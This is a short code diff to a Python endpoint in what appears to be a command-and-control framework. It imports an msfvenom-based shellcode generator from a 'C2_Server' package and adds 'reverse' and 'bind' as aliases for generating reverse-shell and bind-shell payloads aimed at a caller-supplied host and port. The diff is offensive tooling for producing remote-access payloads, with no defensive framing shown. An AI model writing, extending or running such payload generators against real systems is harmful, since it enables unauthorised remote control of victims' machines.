@@ -8,6 +8,7 @@ import subprocess
 import platform
 import random
 import string
+from C2_Server.shellcode_gen import shellcode_gen  # Use the real msfvenom-based generator
 
 # Add the parent directory to the path to import from C2_Server
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -31,7 +32,7 @@ def generate_shellcode():
         key = data.get('key', '')
         shellcode = None
 
-        if shellcode_type == 'reverse_shell':
+        if shellcode_type == 'reverse_shell' or shellcode_type == 'reverse':
             host = data.get('host')
             port = data.get('port')
 
@@ -45,7 +46,7 @@ def generate_shellcode():
 
             shellcode = shellcode_gen.generate_reverse_shell(host, port, platform)
 
-        elif shellcode_type == 'bind_shell':
+        elif shellcode_type == 'bind_shell' or shellcode_type == 'bind':
             port = data.get('port')
 
             if not port:
